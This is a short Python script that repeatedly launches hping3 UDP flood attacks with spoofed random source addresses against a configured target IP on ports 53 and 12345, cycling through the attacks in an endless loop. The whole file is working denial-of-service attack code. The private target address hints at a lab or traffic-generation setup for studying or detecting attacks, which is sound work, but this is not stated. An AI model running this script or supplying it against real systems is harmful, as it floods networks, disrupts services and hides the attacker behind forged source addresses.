import subprocess
import random
import time
import os

TARGET_IP = "172.30.0.2"  # Replace with your target IP
print(f"Starting UDP Attacks on {TARGET_IP}...")


def generate_random_payload_size():
    return random.randint(100, 600)  # Randomize payload size between 100 and 600 bytes


UDP_ATTACKS = [
    # f"hping3 --udp --flood -p 53 {TARGET_IP}",
    # f"hping3 --udp --flood -p 12345 {TARGET_IP} -d {generate_random_payload_size()}",    
    
    f"hping3 --udp --flood -p 53 --rand-source {TARGET_IP}",
    f"hping3 --udp --flood -p 12345 --rand-source {TARGET_IP} -d {generate_random_payload_size()}",
]

i = 0 
j = 0
while True:

    # sleep_intervals = [random.randint(5, 15), random.randint(15, 30), random.randint(35, 60)]
    # random_index = random.randint(0, len(UDP_ATTACKS) - 1)

    # print(f"Executing: {UDP_ATTACKS[i]} for {sleep_intervals[j]} seconds...")

    process = subprocess.Popen(UDP_ATTACKS[i], shell=True)
    
    # time.sleep(sleep_intervals[j])
    time.sleep(1)
    i += 1
    j += 1

    if i == 2:
        i = 0

    if j == 3:
        j = 0

    process.terminate()
    process.wait()
        
    time.sleep(8)
